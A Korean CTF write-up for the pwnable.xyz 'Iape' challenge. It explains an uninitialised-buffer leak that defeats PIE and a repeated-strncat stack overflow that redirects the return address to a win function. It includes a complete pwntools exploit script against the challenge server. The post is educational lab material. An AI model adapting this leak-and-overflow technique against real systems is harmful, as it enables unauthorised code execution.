---
layout: post
title:  "Pwnable.xyz Iape write-up"
date:   2020-02-03 19:45:55
image:  pwnable_xyz_iape.PNG
tags:   [Pwnable_xyz]
categories: [Write-up]
---


### 1.  문제

---

**1) mitigation 확인**

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20iape/Untitled.png)

카나리를 제외하고 모든 보호기법이 다 걸려있다

<br>

**2) 문제 확인**

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20iape/Untitled%201.png)

1번 메뉴를 통해 data를 입력하고, 2번으로 이어붙일수 있는거같다. 하지만 제한된 사이즈만큼만 이어붙일 수 있다. 3번 메뉴로 입력한 데이터를 확인 가능하다

<br>

**3) 코드 확인**

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20iape/Untitled%202.png)

read_int32() 함수로 메뉴를 입력받는다. init 부분인 1번 메뉴를 입력하게 되면, fgets로 128바이트만큼 데이터를 입력할 수 있다. 2번 메뉴는 append함수가 들어있다. 이 함수를 다시 봐보자.

<br>

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20iape/Untitled%203.png)

rand() 함수로 출력되는 랜덤한 값에서 % 16 연산을 한 값을 v3에 저장한다. v3는 0부터 15 사이의 값이 랜덤으로 들어가 있을 것이다. 이 값을 strncat함수의 인자로 넣어 제한된 사이즈 만큼 al 문자열에 이어 붙힌다.

a1은 메인에서 문자열을 저장하는 s 배열이다. 메인문의 fgets 함수는 128바이트 만큼만 입력 가능하지만, strncat을 반복적으로 돌리면 메인의 ret를 덮을 수 있을 것이다. 하지만 PIE가 걸려있기 때문에 base 주소를 구하고, win함수의 offset을 이용하여 ret에 값을 넣어줘야 한다.

<br><br>

### 2. 접근방법

---

base주소를 구하기 위해서 일단 leak을 해야한다. 어디를 leak하면 되는지 한번 봐보자. append 함수가 수행될때 버퍼의 상태를 확인해보자.

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20iape/Untitled%204.png)

append 함수에서 서언된 buf 변수는 rbp-0x20 위치에 들어있다. buf+8 위치에 0x555555554bc2 주소가 들어가 있는데,  해당 위치는 

<br>

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20iape/Untitled%205.png)

read_int32() 함수의 leave부분의 코드영역이다. 쨋든 이게 중요한게 아니라, buf 변수가 초기화 되지 않은 취약점을 이용하여 해당 주소를 leak할수 있다.

<br>

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20iape/Untitled%206.png)

append 함수를 다시 봐보자. 만약 v3이 14이고 8번라인에서 AAAAAAAA(8바이트)만 입력한다면 strncat함수가 수행될 때 al에 buf+14 까지 합쳐지므로 buf+8 ~ buf+14 사이에 들어있는 값을 3번 메뉴를 이용하여 확인 할 수 있다.

leak한 값에서 - 0xbc2를 빼서 base 주소를 얻을 수 있고, 여기에 win함수의 오프셋을 더해서 win함수로 ret을 변경하면 끝이다.

<br>

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20iape/Untitled%207.png)

s 변수는 rbp-0x400의 위치에 있으므로, ret를 덮으려면 0x408의 값을 rbp 까지 채워야한다. 또한 rand() 함수 때문에 v3에 담기는 값이 불규칙적이다. 그냥 v3에 담기는 사이즈만큼 이어붙이면 0x408 만큼 딱 채우기는 힘들다. 따라서 이를 잘 코딩으로 조져야 한다. 

<br><br>

### 3. 풀이

---

최종 익스 코드는 다음과 같다

    from pwn import *
    context.log_level="debug"
    #p=process("./challenge",aslr=False)
    #gdb.attach(p)
    
    p=remote("svc.pwnable.xyz",30014)
    p.sendafter("> ","1")
    p.sendlineafter("data: ","A")
    while 1:
            p.sendafter("> ","2")
    	p.recvuntil("me ")
            size=int(p.recvuntil(" ")[:-1])
            log.info("size :: "+str(size))
    	
    	if size == 0:
    		continue
    
            if size >= 14:
                    p.sendafter("chars: ","B"*8)
    		p.sendafter("> ","3")
    		p.recvuntil("message: ")
    		#log.info(p.recv(16)[10:17])
    		#pause()
    		p.recv(10)
    		for_base=p.recv(6)
    		for_base += "\x00\x00"
    		log.info(len(for_base))
                    base_addr=u64(for_base)-0xbc2
    		log.info(hex(base_addr))
    		log.info(hex(base_addr))
    		break;		
            
    	p.sendafter("chars: ","\x00")
    
    count = 16
    
    while 1:
    	p.sendafter("> ","2")
            p.recvuntil("me ")
            size=int(p.recvuntil(" ")[:-1])
    
    	if size == 0:
    		continue
    
    	if size == 8:
    		log.info("count::"+str(count))
    		p.sendafter("chars: ","A"*size)
    		count += size
    		if count == 0x408:
    			log.info("SIZE::::"+str(count))
    			break
    		continue
    
    	if size==9:
                    log.info("count::"+str(count))
                    p.sendafter("chars: ","A"*(size-1)+"\x00")
                    count += (size-1)
                    if count == 0x408:
                            log.info("SIZE::::"+str(count))
                            break
                    continue
    
            if size==10:
                    log.info("count::"+str(count))
                    p.sendafter("chars: ","A"*(size-2)+"\x00")
                    count += (size-2)
                    if count == 0x408:
                            log.info("SIZE::::"+str(count))
                            break
                    continue
    
            if size==11:
                    log.info("count::"+str(count))
                    p.sendafter("chars: ","A"*(size-3)+"\x00")
                    count += (size-3)
                    if count == 0x408:
                            log.info("SIZE::::"+str(count))
                            break
                    continue
    	
            if size==12:
                    log.info("count::"+str(count))
                    p.sendafter("chars: ","A"*(size-4)+"\x00")
                    count += (size-4)
                    if count == 0x408:
                            log.info("SIZE::::"+str(count))
                            break
                    continue
    
            if size==13:
                    log.info("count::"+str(count))
                    p.sendafter("chars: ","A"*(size-5)+"\x00")
                    count += (size-5)
                    if count == 0x408:
                            log.info("SIZE::::"+str(count))
                            break
                    continue
    
            if size==14:
                    log.info("count::"+str(count))
                    p.sendafter("chars: ","A"*(size-6)+"\x00")
                    count += (size-6)
                    if count == 0x408:
                            log.info("SIZE::::"+str(count))
                            break
                    continue
    
    	p.sendafter("chars: ","\x00")
    
    win = base_addr+0xb57
    log.info("base_addr::"+hex(base_addr))
    log.info("win_addr::"+hex(win))
    
    while 1:
    	p.sendafter("> ","2")
            p.recvuntil("me ")
            size=int(p.recvuntil(" ")[:-1])
    	
    	if size == 0:
    		continue
    
    	if size == 8:
    		#p.sendafter("chars: ",str(win))
    		p.sendafter("chars: ",p64(win))
    		break;
    
    	p.sendafter("chars: ","\x00")
    
    p.sendafter("> ","0")
    
    p.interactive()

너무 막짠거 같지만.. 뭐 플래그는 잘 나오니..ㅋ

<br><br>

### 4. 몰랐던 개념

---

어려운건 딱히 없었는데, 서버에서 데이터를 받는 처리로직이 쪼금 문제가 있어서 거기서 삽질을 한거 같다.